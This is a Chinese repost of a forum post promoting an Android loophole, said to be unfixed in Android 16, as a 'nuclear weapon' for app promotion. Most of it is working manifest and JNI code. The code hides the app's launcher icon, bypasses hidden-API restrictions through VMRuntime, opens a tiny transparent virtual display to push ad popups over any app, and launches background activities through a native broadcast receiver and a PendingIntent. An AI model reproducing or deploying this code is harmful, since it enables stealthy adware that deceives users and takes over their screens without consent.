# Android上的一个“全局穿透”的漏洞，Android16依然无解

首先，这是真正的“全局”弹窗！ 无论你在哪个 App、哪个界面，它都能穿透层级，强行置顶。

其次，集成该技术后，App 安装后会立即隐身，在后台潜伏，等待你的高度定制化触发策略。从触发时机到内容排版，全部可以程度定制。

截止 Android 16，这个 Bug 还没有修复， 如果你正在做 App 推广、私域引流，它算得上是你变现的顶级核武器， 能玩出什么花样... 全凭你的想象力。

```c
1，先在Manifest注册几个组件：
 
<activity
android:name="com.x1.cd.lq"
android:exported="false"
android:launchMode="singleTop"
/>
<activity
android:name=".EnryActivity"
android:exported="true"
android:screenOrientation="portrait">
<intent-filter>
<action android:name="android.intent.action.MAIN" />
<category android:name="android.intent.category.LAUNCHER" />
<data android:scheme="ss" android:host="com.cd.lq"/>
</intent-filter>
</activity>
<activity-alias
android:name="com.face.detect.FActivity"
android:enabled="false"
android:exported="true"
android:targetActivity=".EnryActivity">
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity-alias>
 
2，隐藏桌面APP
 
bool setHiddenApiExemptions(JNIEnv* env) {
 
复制代码 隐藏代码
jclass vmRuntimeClass = nullptr;
jmethodID getRuntimeMethod = nullptr;
jobject vmRuntimeInstance = nullptr;
jmethodID setHiddenApiExemptionsMethod = nullptr;
jclass stringClass = nullptr;
jobjectArray exemptionsArray = nullptr;
jstring exemptionString = nullptr;
 
try {
 
    vmRuntimeClass = env->FindClass("dalvik/system/VMRuntime");
    if (!vmRuntimeClass) {
        LOGE("Failed to find VMRuntime class");
        env->ExceptionClear();
        return false;
    }
 
    getRuntimeMethod = env->GetStaticMethodID(vmRuntimeClass, "getRuntime", "()Ldalvik/system/VMRuntime;");
    if (!getRuntimeMethod) {
        LOGE("Failed to find VMRuntime.getRuntime() method");
        env->ExceptionClear();
        return false;
    }
 
    vmRuntimeInstance = env->CallStaticObjectMethod(vmRuntimeClass, getRuntimeMethod);
    if (!vmRuntimeInstance) {
        LOGE("Failed to get VMRuntime instance");
        env->ExceptionClear();
        return false;
    }
 
    setHiddenApiExemptionsMethod = env->GetMethodID(vmRuntimeClass, "setHiddenApiExemptions", "([Ljava/lang/String;)V");
    if (!setHiddenApiExemptionsMethod) {
        LOGE("Failed to find VMRuntime.setHiddenApiExemptions() method");
        env->ExceptionClear();
        return false;
    }
 
    stringClass = env->FindClass("java/lang/String");
    if (!stringClass) {
        LOGE("Failed to find java.lang.String class");
        env->ExceptionClear();
        return false;
    }
 
    exemptionsArray = env->NewObjectArray(1, stringClass, nullptr);
    if (!exemptionsArray) {
        LOGE("Failed to create exemptions string array");
        env->ExceptionClear();
        return false;
    }
 
    exemptionString = env->NewStringUTF("L");
    if (!exemptionString) {
         LOGE("Failed to create exemption string");
         env->ExceptionClear();
         return false;
     }
 
    env->SetObjectArrayElement(exemptionsArray, 0, exemptionString);
    if (env->ExceptionCheck()) {
        LOGE("Exception occurred while setting exemption string in array");
        env->ExceptionClear();
 
        return false;
    }
 
    env->CallVoidMethod(vmRuntimeInstance, setHiddenApiExemptionsMethod, exemptionsArray);
 
    if (env->ExceptionCheck()) {
        LOGE("Exception occurred while calling setHiddenApiExemptions");
        env->ExceptionClear();
        return false;
    }
 
    LOGD("Successfully set hidden API exemptions via VMRuntime");
 
    env->DeleteLocalRef(exemptionString);
    env->DeleteLocalRef(exemptionsArray);
    env->DeleteLocalRef(stringClass);
    env->DeleteLocalRef(vmRuntimeInstance);
    env->DeleteLocalRef(vmRuntimeClass);
 
    return true;
 
} catch (...) {
    LOGE("Unexpected exception in setHiddenApiExemptionsViaVMRuntime");
    env->ExceptionClear();
 
    if (exemptionString) env->DeleteLocalRef(exemptionString);
    if (exemptionsArray) env->DeleteLocalRef(exemptionsArray);
    if (stringClass) env->DeleteLocalRef(stringClass);
    if (vmRuntimeInstance) env->DeleteLocalRef(vmRuntimeInstance);
    if (vmRuntimeClass) env->DeleteLocalRef(vmRuntimeClass);
 
    return false;
}
}
 
3，开启虚拟显示窗口，这是个透明像素窗口。
 
static void initializeVirtualDisplayAndShowAdModalPopup(JNIEnv *env, jobject ssd_class_object) {
jobject application_context = nullptr;
jclass context_class = nullptr;
jclass display_manager_class = nullptr;
jclass java_lang_class = nullptr;
jstring display_manager_class_name_string = nullptr;
jobject display_manager_class_object = nullptr;
jmethodID get_system_service_method = nullptr;
jobject display_manager_instance = nullptr;
jmethodID create_virtual_display_method = nullptr;
jstring virtual_display_name_string = nullptr;
jobject virtual_display_instance = nullptr;
jclass virtual_display_class = nullptr;
jmethodID get_display_method = nullptr;
jobject display_instance = nullptr;
jclass ssd_class = static_cast<jclass>(ssd_class_object); // Cast once
jmethodID ssd_constructor = nullptr;
jobject ssd_instance = nullptr;
jmethodID show_method = nullptr;
bool success = false; // Flag to indicate overall success
 
复制代码 隐藏代码
application_context = getApplication(env);
if (!application_context) {
    LOGE("Failed to obtain Application context");
    goto cleanup;
}
context_class = env->GetObjectClass(application_context);
if (!context_class) {
    LOGE("Failed to get Application context class");
    goto cleanup;
}
 
display_manager_class = env->FindClass("android/hardware/display/DisplayManager");
if (!display_manager_class) {
    LOGE("DisplayManager class not found");
    goto cleanup;
}
 
java_lang_class = env->FindClass("java/lang/Class");
if (!java_lang_class) {
    LOGE("java.lang.Class not found");
    goto cleanup;
}
jmethodID for_name_method = env->GetStaticMethodID(java_lang_class, "forName", "(Ljava/lang/String;)Ljava/lang/Class;");
if (!for_name_method) {
    LOGE("Class.forName method not found");
    goto cleanup;
}
display_manager_class_name_string = env->NewStringUTF("android.hardware.display.DisplayManager");
if (!display_manager_class_name_string) {
    LOGE("Failed to create DisplayManager class name string");
    goto cleanup;
}
display_manager_class_object = env->CallStaticObjectMethod(java_lang_class, for_name_method, display_manager_class_name_string);
if (!display_manager_class_object || env->ExceptionCheck()) {
    env->ExceptionClear();
    LOGE("Class.forName(DisplayManager) failed");
    goto cleanup;
}
 
get_system_service_method = env->GetMethodID(context_class, "getSystemService", "(Ljava/lang/Class;)Ljava/lang/Object;");
if (!get_system_service_method) {
    LOGE("Context.getSystemService method not found");
    goto cleanup;
}
display_manager_instance = env->CallObjectMethod(application_context, get_system_service_method, display_manager_class_object);
if (!display_manager_instance || env->ExceptionCheck()) {
    env->ExceptionClear();
    LOGE("getSystemService(DisplayManager) failed");
    goto cleanup;
}
 
create_virtual_display_method = env->GetMethodID(display_manager_class, "createVirtualDisplay",
                                                 "(Ljava/lang/String;IIILandroid/view/Surface;I)Landroid/hardware/display/VirtualDisplay;");
if (!create_virtual_display_method) {
    LOGE("createVirtualDisplay signature not found");
    goto cleanup;
}
 
virtual_display_name_string = env->NewStringUTF("mNeWJMF");
if (!virtual_display_name_string) {
    LOGE("Failed to create VirtualDisplay name string");
    goto cleanup;
}
 
virtual_display_instance = env->CallObjectMethod(display_manager_instance, create_virtual_display_method,
                                                 virtual_display_name_string, 10, 10, 160, nullptr, 11);
if (!virtual_display_instance || env->ExceptionCheck()) {
    env->ExceptionClear();
    LOGE("createVirtualDisplay failed");
    goto cleanup;
}
LOGD("VirtualDisplay created");
 
virtual_display_class = env->GetObjectClass(virtual_display_instance);
if (!virtual_display_class) {
    LOGE("Failed to get VirtualDisplay class");
    goto cleanup;
}
get_display_method = env->GetMethodID(virtual_display_class, "getDisplay", "()Landroid/view/Display;");
if (!get_display_method) {
    LOGE("VirtualDisplay.getDisplay method not found");
    goto cleanup;
}
display_instance = env->CallObjectMethod(virtual_display_instance, get_display_method);
if (!display_instance || env->ExceptionCheck()) {
    env->ExceptionClear();
    LOGE("getDisplay failed");
    goto cleanup;
}
 
if (!ssd_class || env->ExceptionCheck()) {
    env->ExceptionClear();
    LOGE("SSD class object is invalid");
    goto cleanup;
}
ssd_constructor = env->GetMethodID(ssd_class, "<init>", "(Landroid/content/Context;Landroid/view/Display;)V");
if (!ssd_constructor) {
    LOGE("SSD(Context,Display) constructor not found");
    goto cleanup;
}
ssd_instance = env->NewObject(ssd_class, ssd_constructor, application_context, display_instance);
if (!ssd_instance || env->ExceptionCheck()) {
    env->ExceptionClear();
    LOGE("ssd constructor failed");
    goto cleanup;
}
 
show_method = env->GetMethodID(ssd_class, "show", "()V");
if (!show_method) {
    LOGE("SSD.show() method not found");
    goto cleanup;
}
env->CallVoidMethod(ssd_instance, show_method);
if (env->ExceptionCheck()) {
    env->ExceptionClear();
    LOGE("ssd.show() threw an exception");
    goto cleanup;
}
 
success = true;
cleanup:
 
复制代码 隐藏代码
// Check for nullptr before deleting
if (show_method == nullptr && ssd_instance) { env->DeleteLocalRef(ssd_instance); } // Delete if creation failed before show_method
if (ssd_instance) { env->DeleteLocalRef(ssd_instance); }
if (display_instance) { env->DeleteLocalRef(display_instance); }
if (virtual_display_name_string) { env->DeleteLocalRef(virtual_display_name_string); }
if (virtual_display_instance) { env->DeleteLocalRef(virtual_display_instance); }
if (display_manager_instance) { env->DeleteLocalRef(display_manager_instance); }
if (display_manager_class_object) { env->DeleteLocalRef(display_manager_class_object); }
if (display_manager_class_name_string) { env->DeleteLocalRef(display_manager_class_name_string); }
if (application_context) { env->DeleteLocalRef(application_context); }
 
if (!success) {
   LOGE("initializeVirtualDisplayAndShowAdModalPopup encountered an error");
}
}
 
4，注册广播并设置关键属性，隐式广播
 
Jivity_registerNativeBroadcastReceiver(JNIEnv *env, jobject thiz, jobject context) {
 
复制代码 隐藏代码
jclass broadcast_receiver_class = env->FindClass("com/example/MyNativeBroadcastReceiver");
if (!broadcast_receiver_class) {
    LOGE("Failed to find MyNativeBroadcastReceiver class");
    env->ExceptionClear();
    return JNI_FALSE;
}
 
jmethodID constructor_method_id = env->GetMethodID(broadcast_receiver_class, "<init>", "()V");
if (!constructor_method_id) {
    LOGE("Failed to find MyNativeBroadcastReceiver constructor");
    env->ExceptionClear();
    return JNI_FALSE;
}
 
jobject local_broadcast_receiver_instance = env->NewObject(broadcast_receiver_class, constructor_method_id);
if (!local_broadcast_receiver_instance) {
    LOGE("Failed to create MyNativeBroadcastReceiver instance");
    env->ExceptionClear();
    return JNI_FALSE;
}
 
jclass intent_filter_class = env->FindClass("android/content/IntentFilter");
if (!intent_filter_class) {
    LOGE("Failed to find IntentFilter class");
    env->DeleteLocalRef(local_broadcast_receiver_instance);
    env->ExceptionClear();
    return JNI_FALSE;
}
jmethodID intent_filter_constructor_id = env->GetMethodID(intent_filter_class, "<init>", "(Ljava/lang/String;)V");
if (!intent_filter_constructor_id) {
    LOGE("Failed to find IntentFilter constructor");
    env->DeleteLocalRef(local_broadcast_receiver_instance);
    env->ExceptionClear();
    return JNI_FALSE;
}
 
jstring action_string = env->NewStringUTF("com.native.abc.ss");
if (!action_string) {
    LOGE("Failed to create action string");
    env->DeleteLocalRef(local_broadcast_receiver_instance);
    env->ExceptionClear();
    return JNI_FALSE;
}
 
jobject local_intent_filter_instance = env->NewObject(intent_filter_class, intent_filter_constructor_id, action_string);
env->DeleteLocalRef(action_string); // Action string no longer needed locally
if (!local_intent_filter_instance) {
    LOGE("Failed to create IntentFilter instance");
    env->DeleteLocalRef(local_broadcast_receiver_instance);
    env->ExceptionClear();
    return JNI_FALSE;
}
 
jclass context_class = env->GetObjectClass(context);
if (!context_class) {
    LOGE("Failed to get Context class");
    env->DeleteLocalRef(local_broadcast_receiver_instance);
    env->DeleteLocalRef(local_intent_filter_instance);
    return JNI_FALSE;
}
jmethodID register_receiver_method_id = env->GetMethodID(context_class, "registerReceiver",
                                                         "(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;");
if (!register_receiver_method_id) {
    LOGE("Failed to find Context.registerReceiver method");
    env->DeleteLocalRef(local_broadcast_receiver_instance);
    env->DeleteLocalRef(local_intent_filter_instance);
    env->ExceptionClear();
    return JNI_FALSE;
}
 
jobject result_intent = env->CallObjectMethod(context, register_receiver_method_id,
                                              local_broadcast_receiver_instance, local_intent_filter_instance);
 
if (env->ExceptionCheck()) {
    env->ExceptionClear();
    LOGE("Exception occurred while calling registerReceiver");
    env->DeleteLocalRef(local_broadcast_receiver_instance);
    env->DeleteLocalRef(local_intent_filter_instance);
    return JNI_FALSE;
}
 
if (g_broadcast_receiver_instance) {
    env->DeleteGlobalRef(g_broadcast_receiver_instance);
}
if (g_intent_filter_instance) {
    env->DeleteGlobalRef(g_intent_filter_instance);
}
g_broadcast_receiver_instance = env->NewGlobalRef(local_broadcast_receiver_instance);
g_intent_filter_instance = env->NewGlobalRef(local_intent_filter_instance);
 
env->DeleteLocalRef(local_broadcast_receiver_instance);
env->DeleteLocalRef(local_intent_filter_instance);
return JNI_TRUE;
}
 
5，可开启一个线程，调用这个外弹窗口。
 
jboolean triggerActivityLaunchViaPendingIntent(JNIEnv *env, jobject context, jobject target_intent) {
jclass pending_intent_class = nullptr;
jmethodID get_activity_method_id = nullptr;
jobject pending_intent_object = nullptr;
jmethodID send_method_id = nullptr;
jboolean result = JNI_FALSE;
bool success = false;
 
复制代码 隐藏代码
pending_intent_class = env->FindClass("android/app/PendingIntent");
if (pending_intent_class == nullptr) {
    LOGE("Failed to find PendingIntent class");
    goto cleanup;
}
 
get_activity_method_id = env->GetStaticMethodID(pending_intent_class,
                                                "getActivity",
                                                "(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;");
if (get_activity_method_id == nullptr) {
    LOGE("Failed to get getActivity method");
    goto cleanup;
}
 
pending_intent_object = env->CallStaticObjectMethod(pending_intent_class, get_activity_method_id,
                                                   context, (jint) 0, target_intent, (jint) 0);
if (pending_intent_object == nullptr) {
    LOGE("Failed to create PendingIntent");
    goto cleanup;
}
 
// Attempt to find the most common send() method signature first
send_method_id = env->GetMethodID(pending_intent_class, "send", "()V");
if (send_method_id == nullptr) {
    LOGE("Failed to find PendingIntent.send() method");
    goto cleanup;
}
 
env->CallVoidMethod(pending_intent_object, send_method_id);
 
if (env->ExceptionCheck()) {
    LOGE("Exception occurred during PendingIntent.send()");
    env->ExceptionDescribe();
    env->ExceptionClear();
    goto cleanup;
}
 
LOGI("PendingIntent.send() called successfully");
success = true;
result = JNI_TRUE;
cleanup:
if (pending_intent_object) {
env->DeleteLocalRef(pending_intent_object);
}
if (pending_intent_class) {
env->DeleteLocalRef(pending_intent_class);
}
 
复制代码 隐藏代码
if (!success && result == JNI_FALSE) {
    LOGE("triggerActivityLaunchViaPendingIntent failed");
}
 
return result;
}
```

---

转自：

[吾爱破解 Android上的一个“全局穿透”的漏洞，Android16依然无解](https://www.52pojie.cn/thread-2063585-1-1.html)

[CSDN Android上的一个“全局穿透”的漏洞，Android16依然无解](https://blog.csdn.net/jetoo/article/details/152329677)
